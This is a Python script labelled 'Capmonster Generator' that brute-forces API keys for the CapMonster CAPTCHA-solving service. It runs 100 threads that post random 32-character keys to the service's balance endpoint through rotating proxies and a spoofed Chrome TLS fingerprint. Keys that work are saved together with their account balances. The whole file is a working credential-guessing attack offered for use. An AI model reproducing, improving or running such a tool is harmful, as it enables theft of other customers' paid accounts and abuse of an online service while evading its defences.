import json
import random
import string
import os
import time
import ctypes
try:
    import requests
    import pystyle
    import colored
    import httpx
    import threading
    from tls_client import Session
except ModuleNotFoundError:
    os.system('pip install requests')
    os.system('pip install pystyle')
    os.system('pip install colored')
    os.system('pip install httpx')
    os.system('pip install threading')
    os.system('pip install tls_client')
from pystyle import Colors, Write, System, Colorate
from colored import fg
from threading import Thread, active_count
blue = fg(6)
reset = fg(7)
red = fg(1)
green = fg(2)
purple = fg(5)
pink = fg(216)
yellow = fg(226)
gray = fg(250)

valid_keys_count = 0
invalid_keys_count = 0


def update_console_title(valid_count, invalid_count):
    ctypes.windll.kernel32.SetConsoleTitleW(f"Capmonster Generator - Valid: {valid_count} | Invalid: {invalid_count} - Made by jxrski")

def gen_keys(long):
    char = string.ascii_lowercase + string.digits
    clave = ''.join(random.choice(char) for _ in range(long))
    return clave

def balance():
    global valid_keys_count, invalid_keys_count

    proxy = (random.choice(open("proxies.txt", "r").readlines()).strip()
             if len(open("proxies.txt", "r").readlines()) != 0
             else None)
    session_proxy = Session(
        client_identifier="chrome_113",
        random_tls_extension_order=True
    )
    session_proxy.proxies = {
        "http": "http://" + proxy,
        "https": "http://" + proxy
    }
    key = gen_keys(32)
    payload = {
        "clientKey": key
    }
    try:
        response = session_proxy.post("https://api.capmonster.cloud/getBalance", json=payload)
        if response.status_code == 200:
            data = response.json()
            balance = data["balance"]
            valid_keys_count += 1
            update_console_title(valid_keys_count, invalid_keys_count)
            with open("valid.txt", "a") as file:
                file.write(key + " | $" + str(balance) + "\n")
            print(f"{purple}[{green}+{purple}]{reset} Valid Key: {green}{key} | Balance: ${balance}")
        elif "ERROR_KEY_DOES_NOT_EXIST" in response.text:
            invalid_keys_count += 1
            update_console_title(valid_keys_count, invalid_keys_count)
            print(f"{purple}[{red}-{purple}]{reset} Invalid Key: {blue}{key}")
        else:
            invalid_keys_count += 1
            update_console_title(valid_keys_count, invalid_keys_count)
            print(f"{purple}[{red}-{purple}]{reset} Invalid Key: {blue}{key}")
    except requests.exceptions.RequestException as e:
        print(f"{purple}[{red}!{purple}]{reset} 502 - Bad Gateway")
        invalid_keys_count += 1
        update_console_title(valid_keys_count, invalid_keys_count)
    except Exception as e:
        print(f"{purple}[{red}!{purple}]{reset} TLSClient Exception...")
        invalid_keys_count += 1
        update_console_title(valid_keys_count, invalid_keys_count)


def start_gen():
    while True:
        balance()

threads = []
for _ in range(100):
    thread = threading.Thread(target=start_gen)
    threads.append(thread)
    thread.start()

for thread in threads:
    thread.join()
